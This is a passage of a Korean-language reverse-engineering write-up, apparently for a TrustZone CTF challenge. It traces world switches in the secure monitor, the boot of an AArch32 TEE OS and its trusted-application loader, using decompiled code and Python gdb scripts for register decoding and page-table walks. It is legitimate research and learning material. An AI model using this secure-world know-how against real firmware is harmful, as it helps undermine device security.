        pwVar2->x0 = 0xffffffffffffffff;
        return pwVar2;
      }
      FUN_0000025c();
      FUN_000002c8();
    }
    FUN_00000b2c(0,tmp.PC + 0x20,0x1d3);
    restore_sysregs(0);
    set_spelx(0);
    (&wctx)[uVar1].x3 = x3;
    (&wctx)[uVar1].x2 = x2;
    (&wctx)[uVar1].x1 = x1;
    (&wctx)[uVar1].x0 = (ulong)x0;
    pwVar2 = &wctx + uVar1;
  }
                    /* 0x000000000e002450      0x000000000e002210 */
  return pwVar2;
}
```
이제 호출되었을 때 어디로 가는지 확인해야할 필요가 있다.
### SPSR_EL3 structure & gdbscript
![](attachment/4d39b7ba32f4b5f44407d8d686ee39c4.png)
![](attachment/daae4d0027962451199dc7bcf06de81a.png)
AArch32에서 exception이 발생했을 때 M bits 인코딩은 위와 같다.
![](attachment/07f2dae481a603f51efbe843681d5667.png)
![](attachment/b59dc51b1a23cd667e025f3141869539.png)
AArch64 exception이 발생했을 때 M bits 인코딩은 위와 같다.
```Python
import gdb
class CPSR(gdb.Command):
    def __init__(self):
        super(CPSR, self).__init__("cpsr", gdb.COMMAND_USER)
    def invoke(self, arg, from_tty):
        cpsr = (int(gdb.parse_and_eval("$cpsr")))
        mode = cpsr & 0b1111
        is_thumb = (cpsr >> 4)&1
        state = (cpsr >> 4)&1
        IRQ = (cpsr >> 5)&1
        FIQ = (cpsr >> 6)&1
        cond = (cpsr >> 27)&0b1111
        re = ''
        if not state:
            if 0b0000 == mode:
                re += 'EL0t' # SP_EL0
            elif 0b0100 == mode:
                re += 'EL1t' # SP_EL0
            elif 0b0101 == mode:
                re += 'EL1h' # SP_EL1
            elif 0b1000 == mode:
                re += 'EL2t' # SP_EL0
            elif 0b1001 == mode:
                re += 'EL2h' # SP_EL2
            elif 0b1100 == mode:
                re += 'EL3t' # SP_EL0
            elif 0b1101 == mode:
                re += 'EL3h' # SP_EL3
            else:
                re += 'UNK'
        else:
            if 0b0000 == mode:
                re += 'User'
            elif 0b0001 == mode:
                re += 'FIQ'
            elif 0b0010 == mode:
                re += 'IRQ'
            elif 0b0011 == mode:
                re += 'Supervisor'
            elif 0b0110 == mode:
                re += 'Monitor'
            elif 0b0111 == mode:
                re += 'Abort' 
            elif 0b1010 == mode:
                re += 'Hyp' 
            elif 0b1011 == mode:
                re += 'Undefined' 
            elif 0b1111 == mode:
                re += 'System' 
            else:
                re += 'UNK'
        re += ' | '
        if IRQ:
            re += 'IRQ_MASKED | '
        elif FIQ:
            re += 'FIQ_MASKED | '
        if is_thumb:
            re += 'THUMB_MODE | '
        if state:
            re += '32-BIT | '
        else:
            re += '64-BIT | '
        re += f'COND_{hex(cond)[2:]}'
        print(re)
class SPSR_EL3(gdb.Command):
    def __init__(self):
        super(SPSR_EL3, self).__init__("spsr_el3", gdb.COMMAND_USER)
    def invoke(self, arg, from_tty):
        spsr = (int(gdb.parse_and_eval("$SPSR_EL3")))
        mode = spsr & 0b1111
        is_thumb = (spsr >> 4)&1
        IRQ = (spsr >> 7)&1
        FIQ = (spsr >> 6)&1
        cond = (spsr >> 27)&0b11111
        state = (spsr >> 4)&1
        re = ''
        if not state:
            if 0b0000 == mode:
                re += 'EL0t' # SP_EL0
            elif 0b0100 == mode:
                re += 'EL1t' # SP_EL0
            elif 0b0101 == mode:
                re += 'EL1h' # SP_EL1
            elif 0b1000 == mode:
                re += 'EL2t' # SP_EL0
            elif 0b1001 == mode:
                re += 'EL2h' # SP_EL2
            elif 0b1100 == mode:
                re += 'EL3t' # SP_EL0
            elif 0b1101 == mode:
                re += 'EL3h' # SP_EL3
            else:
                re += 'UNK'
        else:
            if 0b0000 == mode:
                re += 'User'
            elif 0b0001 == mode:
                re += 'FIQ'
            elif 0b0010 == mode:
                re += 'IRQ'
            elif 0b0011 == mode:
                re += 'Supervisor'
            elif 0b0110 == mode:
                re += 'Monitor'
            elif 0b0111 == mode:
                re += 'Abort' 
            elif 0b1010 == mode:
                re += 'Hyp' 
            elif 0b1011 == mode:
                re += 'Undefined' 
            elif 0b1111 == mode:
                re += 'System' 
            else:
                re += 'UNK'
        re += ' | '
        if IRQ:
            re += 'IRQ_MASKED | '
        elif FIQ:
            re += 'FIQ_MASKED | '
        if is_thumb:
            re += 'THUMB_MODE | '
        if state:
            re += '32-BIT | '
        else:
            re += '64-BIT | '
        re += f'COND_{hex(cond)[2:]}'
        print(re)
        
CPSR()
SPSR_EL3()
```
기존 cpsr도 같이 수정했다.
![](attachment/1053b8224ac974f745e085a7978fc258.png)
### AArch32 PE modes
근데 mode가 약간 생소하다.
![](attachment/cf8ff4ac90a9a7be9a6b9d2330073709.png)
![](attachment/29573e26e1e2c0ae06c50a30d87df00b.png)
그냥 이름만 있어보이게 나눠놓고 결국 결론은 S-EL1이다.
### Diving into BL1 again
![](attachment/643d7f7884b1853da9f0537f822dc09e.png)
S-EL1을 보다가 못 읽겠어서 이번엔 aarch32 manual을 찾아서 읽어봤다.
그랬더니 이미 정의된 주소로 핸들링을 수행한다고 한다.
Secure VBAR을 확인해야한다.
```Assembly
                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  FUN_000014f4 ()
             undefined         r0:1           <RETURN>
                             FUN_000014f4                                    XREF[1]:     Reset:00000000 (T) , 
                                                                                          Reset:00000000 (j)   
        000014f4 00  80  a0  e1    cpy        r8,r0
        000014f8 2c  80  8f  e5    str        r8,[DAT_0000152c ]
                             SCTLR
        000014fc 10  0f  11  ee    mrc        p15,0x0 ,r0,cr1 ,cr0 ,0x0                          SCTLR
        00001500 01  00  c0  e3    bic        r0,r0,#0x1
        00001504 02  00  c0  e3    bic        r0,r0,#0x2
        00001508 04  00  c0  e3    bic        r0,r0,#0x4
        0000150c 08  00  c0  e3    bic        r0,r0,#0x8
        00001510 10  00  c0  e3    bic        r0,r0,#0x10
        00001514 01  0a  c0  e3    bic        r0,r0,#0x1000
        00001518 10  0f  01  ee    mcr        p15,0x0 ,r0,cr1 ,cr0 ,0x0
                             VBAR
        0000151c 10  8f  0c  ee    mcr        p15,0x0 ,r8,cr12 ,cr0 ,0x0
        00001520 36  00  00  eb    bl         FUN_00001600                                     undefined FUN_00001600()
        00001524 5b  00  00  eb    bl         FUN_00001698                                     undefined FUN_00001698()
                             LAB_00001528                                    XREF[1]:     00001528 (j)   
        00001528 fe  ff  ff  ea    b          LAB_00001528
```
aarch64와 다르게 생소하게 접근한다.
![](attachment/340843d4ea3252d12bf8101be370fa9b.png)
읽는 법은 위처럼 읽으면 된다.
  
근데 여기서 VBAR 인자가 뭔지 잘 모르겠다
그래서 부트로더로 다시 돌아가서 secure world가 어떻게 초기화되는지 분석해야한다.
```C
void FUN_ffffffffc0008000(void)
{
  vbar_el1 = 0xffffffffc000a000;
  InstructionSynchronizationBarrier();
  FUN_ffffffffc0009234(DAT_ffffffffc0008048,DAT_ffffffffc0008050);
  spsel = 0;
  FUN_ffffffffc0008228();
  FUN_ffffffffc0008930();
  FUN_ffffffffc0008210();
                    /* trustzone initialize */
  FUN_ffffffffc00081e8();
  FUN_ffffffffc00083a8();
  FUN_ffffffffc000914c();
  do {
    WaitForInterrupt();
  } while( true );
}
```
kernel의 첫 페이지는 IPA 0x0에 매핑되어있다.
그래서 실질적으로 rebase해서 EL1을 분석할 때는 초기 페이지들을 날리고 했어야했다.
어쨋든 FUN_ffffffffc0008210에서 TEE OS initialize를 한다.
```C
                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  FUN_ffffffffc00081e8 ()
             undefined         w0:1           <RETURN>
             undefined8        Stack[-0x10]:8 local_10                                XREF[2]:     ffffffffc00081e8
                                                                                                   ffffffffc0008208
                             FUN_ffffffffc00081e8                            XREF[1]:     FUN_ffffffffc0008000:ffffffffc00
     fffc00081e8 fd  7b  bf  a9    stp        x29 ,x30 ,[sp, #local_10 ]!
     fffc00081ec fd  03  00  91    mov        x29 ,sp
     fffc00081f0 03  00  80  d2    mov        x3,#0x0
     fffc00081f4 02  00  80  d2    mov        x2,#0x0
     fffc00081f8 01  00  80  d2    mov        x1,#0x0
     fffc00081fc 20  00  80  d2    mov        x0,#0x1
     fffc0008200 00  60  b0  f2    movk       x0,#0x8300 , LSL #16
     fffc0008204 d8  03  00  94    bl         secure_monitor_call                              undefined secure_monitor_call()
     fffc0008208 fd  7b  c1  a8    ldp        x29 =>local_10 ,x30 ,[sp], #0x10
     fffc000820c c0  03  5f  d6    ret
```
이렇게 부른다.
```C
bool FUN_0000025c(void)
{
  bool bVar1;
  ulong uVar2;
  
  uVar2 = ret_0();
  bVar1 = DAT_0e000008 != 0;
  if (bVar1) {
    normal_ctx._536_4_ = 1;
    FUN_00000120(0xe000000,1,DAT_0e000008,0xe400000,1,2,(uVar2 & 0xffffffff) * 0x220 + 0xe002430);
  }
  return !bVar1;
}
```
0xe000000가 보이는거 보니 boot argument 같은 것으로 보인다.
BL1에서 0x68 만큼 copy한 데이터에 속한다.
![](attachment/577f1089824846bcb526437568648b71.png)
```C
void FUN_00000120(undefined *param_1,int param_2,undefined8 param_3,undefined8 param_4,
                 undefined8 param_5,undefined8 param_6,undefined4 *param_7)
{
  undefined8 uVar1;
  undefined4 uVar2;
  
  uVar1 = mpidr_el1;
  *(undefined8 *)(param_7 + 2) = uVar1;
  *param_7 = 0;
  FUN_000008ac(param_7 + 8,0);
  uVar1 = sctlr_el3;
  if (((uint)uVar1 >> 0x19 & 1) == 0) {
    uVar2 = 4;
  }
  else {
    uVar2 = 6;
  }
  *param_1 = 1;
  param_1[1] = 1;
  *(undefined2 *)(param_1 + 2) = 0x58;
  *(undefined4 *)(param_1 + 4) = uVar2;
  *(undefined8 *)(param_1 + 8) = param_3;
  if (param_2 == 0) {
    *(undefined4 *)(param_1 + 0x10) = 0x3c5;
  }
  else {
    *(undefined4 *)(param_1 + 0x10) = 0x1d3;
  }
  print_log(s_(_TEE_PC:_%lx_000018d0,param_3);
  print_log(s_(_TEE_SPSR:_%x_000018e0,*(undefined4 *)(param_1 + 0x10));
  set_zero(param_1 + 0x18,(char *)0x40);
  *(undefined8 *)(param_1 + 0x18) = param_4;
  *(undefined8 *)(param_1 + 0x20) = param_5;
  *(undefined8 *)(param_1 + 0x28) = param_6;
  return;
}
```
위와 같이 초기화해준다.
log print 과정에서 PC와 SPSR을 식별할 수 있다.
```C
void FUN_000009a0(world_ctx *secure_context,long param_2)
{
  uint uVar1;
  long lVar2;
  undefined8 uVar3;
  uint uVar4;
  uint new_SCR;
  uint ns;
  
  ns = *(uint *)(param_2 + 4) & 1;
  set_zero((char *)secure_context,(char *)0x200);
  uVar3 = scr_el3;
  new_SCR = (uint)uVar3 & 0xfffff2f8;
  if (ns != 0) {
    new_SCR = new_SCR | 1;
  }
  uVar1 = *(uint *)(param_2 + 0x10);
  uVar4 = uVar1 >> 4 & 1;
  if (uVar4 == 0) {
    new_SCR = new_SCR | 0x400;
  }
  if ((*(uint *)(param_2 + 4) >> 2 & 1) != 0) {
    new_SCR = new_SCR | 0x800;
  }
  new_SCR = new_SCR & 0xfffffff7;
  if (((uVar4 == 0) && ((uVar1 >> 2 & 3) == 2)) || ((uVar4 != 0 && ((uVar1 & 0xf) == 10)))) {
    new_SCR = new_SCR | 0x100;
  }
  if (uVar4 == 0) {
    uVar1 = 0x30d00800;
  }
  else {
    uVar1 = 0xc50838;
  }
  (secure_context->sysregs).SCTLR_EL1 = (ulong)((*(uint *)(param_2 + 4) & 2) << 0x18 | uVar1);
  lVar2 = actlr_el1;
  (secure_context->sysregs).ACTLR_EL1 = lVar2;
  if (ns == 0) {
    (secure_context->sysregs).PMCR_EL0 = 0x60;
  }
                    /* SCR_EL3.NS = 0 */
  secure_context->scr_el3 = (ulong)new_SCR;
  secure_context->pc = *(uint64_t *)(param_2 + 8);
  secure_context->spsr = (ulong)*(uint *)(param_2 + 0x10);
  FUN_0000116c(secure_context,param_2 + 0x18,0x40);
  return;
}
```
위와 같이 secure context를 세팅한다.
```C
void FUN_000001f8(long param_1)
{
  restore_sysregs(0);
  set_spelx(0);
  FUN_00000c90(param_1 + 0x10);
  return;
}
```
FUN_00000c90 내부적으로 시스템 레지스터 세팅하고 eret한다.
대충 어떤식으로 world switch가 일어나고 어디를 분석해야할지 알게 되었다.
## Secure world pagewalk gdbscript
qemu에서 system registers를 보여주는데 오류가 있어서 직접 pagewalk를 하는 스크립트를 따로 작성했다.
![](attachment/669376547659f5485e8f9dd5bde3f8cb.png)
![](attachment/4c79781ac982b5ca8673dc31740d6f9e.png)
메뉴얼은 적당히 보고 넘기면서 구현했다.
위 AP\[2:1\] 모델을 보고 권한을 맞췄다.
```C
undefined4 FUN_080001e8(uint addr,uint phys_addr,uint param_3)
{
  uint uVar1;
  int iVar2;
  uint lvl1_idx;
  uint local_30;
  uint uStack_2c;
  
  local_30 = 0x60f;
  if ((param_3 & 2) != 0) {
    local_30 = 0x64f;
  }
  if ((param_3 & 1) != 0) {
    local_30 = local_30 | 0x80;
  }
  uStack_2c = 0;
  if ((param_3 & 4) != 0) {
    uStack_2c = 0x400000;
  }
  if ((param_3 & 8) != 0) {
    uStack_2c = uStack_2c | 0x200000;
  }
  if ((param_3 & 0x10) != 0) {
    local_30 = local_30 | 0x20;
  }
  lvl1_idx = addr >> 21 & 0x7f;
  if ((*(uint *)(&trans_table_lvl1 + lvl1_idx * 8) | *(uint *)(lvl1_idx * 8 + 0x8004004)) == 0) {
    uVar1 = FUN_0800019c(&trans_table_lvl2 + lvl1_idx * 0x1000);
    *(uint *)(&trans_table_lvl1 + lvl1_idx * 8) = uVar1 | 3;
    FUN_08001944(&trans_table_lvl2 + lvl1_idx * 0x1000,0,0x1000);
  }
  iVar2 = ((addr >> 0xc & 0x1ff) + lvl1_idx * 0x200) * 8;
  *(uint *)(&trans_table_lvl2 + iVar2) = local_30 | phys_addr;
  *(uint *)(iVar2 + 0x8005004) = uStack_2c;
  return 0;
}
```
읽었던 메뉴얼이랑 세부 사항이 다른 것같아서 리버싱한 결과대로 구현했다.
빠르게 구현하는데 초점을 맞춰서 구현이 제대로 되었는지는 잘 모르겠다.
기존에 미리 작성했던 secure world의 물리 메모리를 읽는 스크립트를 이용해서 구현했다.
```C
import gdb
TTBR0_EL1 = 0xe404000
gdb.execute('source ./gdbscript.py')
res = gdb.execute(f'qemu_support read_phys {TTBR0_EL1} 512',to_string=True)
res = res.split('\n')[:-1]
next_table = []
next_table_idx = []
for idx, line in enumerate(res):
    l = (line.split())
    v0, v1 = int(l[1],16), int(l[2],16) 
    if v0 & 0b11: # exists
        next_table.append(v0)
        next_table_idx.append(idx*2)
    if v1 & 0b11: 
        next_table.append(v1)
        next_table_idx.append(idx*2+1)
for idx,i in enumerate(next_table):
    res = gdb.execute(f'qemu_support read_phys {(i>>10)<<10} 512',to_string=True)
    res = res.split('\n')[:-1]
    def f(v):
        E = ''
        if (v>>53)&1:
            E += 'PXN '
        if (v>>54)&1:
            E += 'XN '
        if (v>>5)&1:
            E += 'NS '
        AP = (v >> 6)&3
        if AP == 0b00:
            E += 'PL1 Read/Write PL0 No-Access '
        elif AP == 0b01:
            E += 'PL1 Read/Write PL0 Read/Write '
        elif AP == 0b10:
            E += 'PL1 Read-Only PL0 No-Access '
        elif AP == 0b11:
            E += 'PL1 Read-Only PL0 Read-Only '
        return E
    PT = ''
    if (i >> 2)&1:
        PT += 'XN '
    if (i >> 3)&1:
        PT += 'NS '
    
    for j, line in enumerate(res):
        l = (line.split())
        v0, v1 = int(l[1],16), int(l[2],16) 
        if v0 & 0b11: # exists
            bits = (next_table_idx[idx] << 21)
            bits |= ((j*2) << 12)
            print(hex(bits),hex(((v0>>12)<<12)&(2**36-1)),PT,f(v0))
        if v1 & 0b11: 
            bits = (next_table_idx[idx] << 21)
            bits |= ((j*2+1) << 12)
            print(hex(bits),hex(((v1>>12)<<12)&(2**36-1)),PT,f(v1))
```
![](attachment/b917a25c82e957aba8851cb91e18edc5.png)
Exception vector tables를 포함한 text 부분이 PL1에서도 Read-Only 인 것을 보니 구현이 틀리지는 않았을 것 같다.
## Reverse engineering S-EL1
VBAR은 0xe400000 이다.
```C
void FUN_00001698(void)
{
  uint uVar1;
  undefined4 in_cr0;
  undefined4 in_cr2;
  undefined4 in_cr8;
  undefined4 in_cr10;
  undefined4 in_cr12;
  
  coprocessor_moveto2(0xf,0,DAT_00001798 + (0x16a0 - DAT_000017a8),0,in_cr2);
  coprocessor_moveto2(0xf,1,0,0,in_cr2);
  coprocessor_moveto(0xf,0,0,0xff440400,in_cr10,in_cr2);
  coproc_moveto_Translation_table_control(0x80802504);
  coproc_moveto_Domain_Access_Control(DAT_000017ac);
  coprocessor_moveto(0xf,0,0,DAT_000017b0,in_cr12,in_cr0);
  uVar1 = coproc_movefrom_Control();
  coproc_moveto_Control(uVar1 | 1);
  InstructionSynchronizationBarrier(0xf);
  setSupervisorMode();
  coprocessor_moveto(0xf,0,0,DAT_000017b4,in_cr12,in_cr0);
  uVar1 = coproc_movefrom_Coprocessor_Access_Control();
  coproc_moveto_Coprocessor_Access_Control(uVar1 & 0x7fffffff | 0xf00000);
  InstructionSynchronizationBarrier(0xf);
  uVar1 = coprocessor_movefromRt(10,7,0,in_cr8,in_cr0);
  coprocessor_moveto(10,7,0,uVar1 | 0x40000000,in_cr8,in_cr0);
  uVar1 = coproc_movefrom_Control();
  coproc_moveto_Control(uVar1 | 0x1804);
  FUN_00000060(uVar1 | 0x1804);
  setSupervisorMode();
  *(undefined4 *)(DAT_000017bc + 0x44) = DAT_000017c0;
  setAbortMode();
  setUndefinedMode();
  software_smc(0);
  do {
                    /* WARNING: Do nothing block with infinite loop */
  } while( true );
}
```
이런 괴랄한 코드는 어떻게 읽는지 모르겠다.
```C
                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  FUN_00001698 ()
             undefined         r0:1           <RETURN>
                             FUN_00001698                                    XREF[1]:     FUN_000014f4:00001524 (c)   
        00001698 0f  a0  a0  e1    cpy        r10 ,pc
        0000169c 04  01  9f  e5    ldr        r0,[DAT_000017a8 ]                               = A0160008h
        000016a0 00  a0  4a  e0    sub        r10 ,r10 ,r0
        000016a4 ec  00  9f  e5    ldr        r0,[DAT_00001798 ]                               = 00400008h
        000016a8 0a  00  80  e0    add        r0,r0,r10
        000016ac 00  a0  a0  e3    mov        r10 ,#0x0
        000016b0 02  0f  4a  ec    mcrr       p15,0x0 ,r0,r10 ,cr2
        000016b4 00  00  a0  e3    mov        r0,#0x0
        000016b8 12  0f  4a  ec    mcrr       p15,0x1 ,r0,r10 ,cr2
        000016bc ff  04  a0  e3    mov        r0,#0xff000000
        000016c0 11  07  80  e3    orr        r0,r0,#0x440000
        000016c4 01  0b  80  e3    orr        r0,r0,#0x400
        000016c8 12  0f  0a  ee    mcr        p15,0x0 ,r0,cr10 ,cr2 ,0x0
        000016cc 02  01  a0  e3    mov        r0,#0x80000000
        000016d0 04  00  80  e3    orr        r0,r0,#0x4
        000016d4 02  0a  80  e3    orr        r0,r0,#0x2000
        000016d8 02  05  80  e3    orr        r0,r0,#0x800000
        000016dc 01  0b  80  e3    orr        r0,r0,#0x400
        000016e0 01  0c  80  e3    orr        r0,r0,#0x100
        000016e4 50  0f  02  ee    mcr        p15,0x0 ,r0,cr2 ,cr0 ,0x2
        000016e8 bc  00  9f  e5    ldr        r0,[DAT_000017ac ]                               = 55555555h
        000016ec 10  0f  03  ee    mcr        p15,0x0 ,r0,cr3 ,cr0 ,0x0
        000016f0 ff  ff  ff  ea    b          LAB_000016f4
```
mcrr은 register 두 개를 쓰는거라 64-bit 시스템 레지스터에 쓴다고 한다.
![](attachment/4d97b376cb5b048f419e1c220f3abebf.png)
![](attachment/179ec0a9aa2fb5fdb0c6325a71daad30.png)
이런식의 인코딩 차이가 있다.
드디어 CRm만 가지고 어떻게 표를 보는지 알게 되었다.
  
bios.bin을 FEFFFFEA로 패치해서 무한루프를 만들어서 원하는 곳을 디버깅할 수 있다.
Normal world에 대한 디버깅 능력을 상실했으니 무조건 secure world에서 멈춰야한다.
![](attachment/ace6c929cddcc14726be50b664d52ce9.png)
![](attachment/bc5fe1f74ab941ea69bec2a4011b40aa.png)
![](attachment/dfcec7f41fc8523ef2d70b8202a127b9.png)
디버거가 시스템 레지스터를 제대로 표현하지 못한다.
```C
void FUN_0e401698(void)
{
  uint uVar1;
  undefined4 in_cr0;
  undefined4 in_cr2;
  undefined4 in_cr8;
  undefined4 in_cr10;
  undefined4 in_cr12;
  
                    /* TTBR0 */
  coprocessor_moveto2(0xf,0,DAT_0e401798 + (0xe4016a0 - DAT_0e4017a8),0,in_cr2);
                    /* TTBR1 */
  coprocessor_moveto2(0xf,1,0,0,in_cr2);
  coprocessor_moveto(0xf,0,0,0xff440400,in_cr10,in_cr2);
                    /* TTBCR */
  coproc_moveto_Translation_table_control(0x80802504);
                    /* DACR */
  coproc_moveto_Domain_Access_Control(DAT_0e4017ac);
                    /* VBAR */
  coprocessor_moveto(0xf,0,0,LONG_0e4017b0,in_cr12,in_cr0);
  uVar1 = coproc_movefrom_Control();
                    /* enable mmu */
  coproc_moveto_Control(uVar1 | 1);
  InstructionSynchronizationBarrier(0xf);
  setSupervisorMode();
  coprocessor_moveto(0xf,0,0,DAT_0e4017b4,in_cr12,in_cr0);
  uVar1 = coproc_movefrom_Coprocessor_Access_Control();
  coproc_moveto_Coprocessor_Access_Control(uVar1 & 0x7fffffff | 0xf00000);
  InstructionSynchronizationBarrier(0xf);
  uVar1 = coprocessor_movefromRt(10,7,0,in_cr8,in_cr0);
  coprocessor_moveto(10,7,0,uVar1 | 0x40000000,in_cr8,in_cr0);
  uVar1 = coproc_movefrom_Control();
  coproc_moveto_Control(uVar1 | 0x1804);
  FUN_0e400060(uVar1 | 0x1804);
  setSupervisorMode();
  *(undefined4 *)(DAT_0e4017bc + 0x44) = DAT_0e4017c0;
  setAbortMode();
  setUndefinedMode();
  software_smc(0);
  do {
                    /* WARNING: Do nothing block with infinite loop */
  } while( true );
}
```
천천히 보니 대충 어떤 행동을 하고 있는지 알 것 같다.
![](attachment/87532572428032bf14ca6270982aa914.png)
MMU를 키고 그냥 00으로 밀려있다.
![](attachment/7d6622457a7f27860ccf39a922d9cabc.png)
많이 따라갈 필요도 없이 손으로 해도 될 것같다.
![](attachment/2bbfb57af26557baa29be290ed5e6849.png)
구조도 별로 다른건 없어보인다.
VBAR는 VA 0x8000040 이지만, PA로 변환해보면 0xe400040이다.
![](attachment/4721170053930c04d3ba1d2683062b3c.png)
MMU가 한번 활성화되면 이후엔 디버깅이 안되고 그냥 알아서 넘어가버리기 때문에 MMU bit 활성화 이후를 디버깅할 수 없다.
그래서 vector table entry에 무한 루프 걸어놓고 마저 디버깅을 시도했다.
![](attachment/b028e6ec5300e84339303cb8ed0a2c88.png)
Prefetch Abort에 잡히는 걸 보니 예상대로 그냥 거기서 에러나서 뛰는 것 같다.
![](attachment/2afe6941fa997b6d5d55061db764467b.png)
Abort라서 그런지 mode도 Abort로 바뀐다.
cps로 다시 supervisor mode로 변경해서 마저 TEE os initialization을 수행한다.
```C
void UndefinedFunction_0e40004c(void)
{
  uint uVar1;
  undefined4 in_cr0;
  undefined4 in_cr8;
  undefined4 in_cr12;
  
  setSupervisorMode();
  coprocessor_moveto(0xf,0,0,DAT_0e4017b4,in_cr12,in_cr0);
  uVar1 = coproc_movefrom_Coprocessor_Access_Control();
  coproc_moveto_Coprocessor_Access_Control(uVar1 & 0x7fffffff | 0xf00000);
  InstructionSynchronizationBarrier(0xf);
  uVar1 = coprocessor_movefromRt(10,7,0,in_cr8,in_cr0);
  coprocessor_moveto(10,7,0,uVar1 | 0x40000000,in_cr8,in_cr0);
  uVar1 = coproc_movefrom_Control();
  coproc_moveto_Control(uVar1 | 0x1804);
  FUN_0e400060(uVar1 | 0x1804);
  setSupervisorMode();
  *(undefined4 *)(DAT_0e4017bc + 0x44) = DAT_0e4017c0;
  setAbortMode();
  setUndefinedMode();
  software_smc(0);
                    /* WARNING: Bad instruction - Truncating control flow here */
  halt_baddata();
}
```
다시 VBAR을 정상적으로 세팅해준다.
```C
        0e401754 10  0f  01  ee    mcr        p15,0x0 ,r0,cr1 ,cr0 ,0x0
        0e401758 58  d0  9f  e5    ldr        sp,[DAT_0e4017b8 ]                               = 08087000h
        0e40175c 3f  fa  ff  fa    blx        FUN_0e400060                                     undefined FUN_0e400060()
        0e401760 13  00  02  f1    cps        #19
        0e401764 50  d0  9f  e5    ldr        sp,[DAT_0e4017bc ]                               = 08085000h
        0e401768 50  00  9f  e5    ldr        r0,[DAT_0e4017c0 ]                               = 10000000h
```
thumb로 모드를 변경한다.
```C
        08001780 3c  10  9f  e5    ldr        r1,[DAT_080017c4 ]                               = 08000000h
        08001784 02  00  00  e3    movw       r0,#0x2
        08001788 00  03  48  e3    movt       r0,#0x8300
        0800178c 70  00  60  e1    smc        0x0
```
그리고 다시 smc를 불러서 secure monitor로 돌아간다.
의사코드만 읽다가 위 어셈블리 스니펫을 놓쳤었는데, 이거 때문에 하루종일 삽질했다.
![](attachment/1755d65849477888fa44cd2fd30caeb7.png)
다시 secure monitor로 돌아가면 r1을 저장하며, TEE OS initialized 문구를 출력한다
EL0에서 TA_Bin을 secure world로 업로드했었는데, 거기를 처리하는 로직을 찾아야한다.
secure monitor 분석 결과를 기반으로 처리 로직은 vector_table + 0x20 를 따라가면 나온다는 것을알고 있다.
```C
void FUN_0800087c(void)
{
  undefined4 local_c;
  
  switch(DAT_08085000) {
  case 0x83000003:
    local_c = FUN_08000724(DAT_08085004,uRam08085008);
    break;
  case 0x83000004:
    local_c = FUN_08000790(DAT_08085004,uRam08085008);
    break;
  case 0x83000005:
    local_c = FUN_080007ea(DAT_08085004,uRam08085008);
    break;
  case 0x83000006:
    local_c = FUN_0800083e(DAT_08085004);
    break;
  default:
    local_c = 0xffffffff;
  }
  secure_monitor_call(0x83000007,local_c);
  return;
}
```
entry 부터 쭉 따라가다 보면 바로 원하는 로직을 발견할 수 있다.
여기서 업로드 로직을 확인해야 secure world에서 동작하는 user binary가 어떻게 동작하는지 알 수 있다.
```C
undefined4 FUN_08000c38(int param_1,undefined4 param_2)
{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  
  iVar1 = FUN_08000bb0(param_1,param_2);
  if (iVar1 != 0) {
    iVar4 = *(int *)(param_1 + 0x10);
    iVar5 = ((*(int *)(param_1 + 0x10) - 1U >> 0xc) + 1) * 0x1000;
    iVar1 = FUN_0800042e(*(undefined4 *)(param_1 + 0xc),iVar5,10);
    if ((((iVar1 != -1) &&
         ((iVar1 = ((*(int *)(param_1 + 0x18) - 1U >> 0xc) + 1) * 0x1000,
          *(int *)(param_1 + 0x18) == 0 ||
          (iVar2 = FUN_0800042e(*(undefined4 *)(param_1 + 0x14),iVar1,0xe), iVar2 != -1)))) &&
        ((iVar2 = ((*(int *)(param_1 + 0x20) - 1U >> 0xc) + 1) * 0x1000,
         *(int *)(param_1 + 0x20) == 0 ||
         (iVar3 = FUN_0800042e(*(undefined4 *)(param_1 + 0x1c),iVar2,0xe), iVar3 != -1)))) &&
       (iVar3 = FUN_0800042e(0xff8000,0x8000,0xe), iVar3 != -1)) {
      FUN_08001944(*(undefined4 *)(param_1 + 0xc),0,iVar5);
      FUN_08001906(*(undefined4 *)(param_1 + 0xc),param_1 + 0x24,*(undefined4 *)(param_1 + 0x10));
      if (*(int *)(param_1 + 0x18) != 0) {
        FUN_08001944(*(undefined4 *)(param_1 + 0x14),0,iVar1);
        FUN_08001906(*(undefined4 *)(param_1 + 0x14),param_1 + iVar4 + 0x24,
                     *(undefined4 *)(param_1 + 0x18));
      }
      if (*(int *)(param_1 + 0x20) != 0) {
        FUN_08001944(*(undefined4 *)(param_1 + 0x1c),0,iVar2);
      }
      FUN_08001944(0xff8000,0,0x8000);
      uRam08085048 = *(undefined4 *)(param_1 + 8);
      iRam0808504c = *(int *)(param_1 + 0x20) + *(int *)(param_1 + 0x1c) + -4;
      return 0;
    }
  }
  return 0xffffffff;
}
```
위는 커스텀 로더의 구현이다.
```C
undefined4 FUN_08000bb0(undefined4 param_1,undefined4 param_2)
{
  int iVar1;
  undefined auStack_a0 [112];
  undefined auStack_30 [32];
  undefined4 local_10;
  int local_c;
  
  local_10 = 0x800304c;
  FUN_080011a2(auStack_a0);
  FUN_08001228(auStack_a0,param_1,param_2);
  FUN_08001296(auStack_a0,auStack_30);
  local_c = 0;
  while( true ) {
    if (local_c != 0) {
      return 0;
    }
    iVar1 = FUN_080018b4(auStack_30,local_10,0x20);
    if (iVar1 == 0) break;
    local_c = local_c + 1;
  }
  return 1;
}
```
검증 로직으로 보인다.
```C
int FUN_080018b4(byte *param_1,byte *param_2,int param_3)
{
  byte bVar1;
  byte bVar2;
  int local_24;
  byte *local_10;
  byte *local_c;
  
  local_24 = param_3;
  local_10 = param_2;
  local_c = param_1;
  do {
    if (local_24 == 0) {
      return 0;
    }
    bVar1 = *local_c;
    bVar2 = *local_10;
    local_24 = local_24 + -1;
    local_10 = local_10 + 1;
    local_c = local_c + 1;
  } while (bVar1 == bVar2);
  return (uint)bVar1 - (uint)bVar2;
}
```
0x20 만큼 비교를 수행하는 것으로 보인다.
```C
void FUN_080011a2(int param_1)
{
  *(undefined4 *)(param_1 + 0x40) = 0;
  *(undefined4 *)(param_1 + 0x48) = 0;
  *(undefined4 *)(param_1 + 0x4c) = 0;
  *(undefined4 *)(param_1 + 0x50) = 0x6a09e667;
  *(undefined4 *)(param_1 + 0x54) = 0xbb67ae85;
  *(undefined4 *)(param_1 + 0x58) = 0x3c6ef372;
  *(undefined4 *)(param_1 + 0x5c) = 0xa54ff53a;
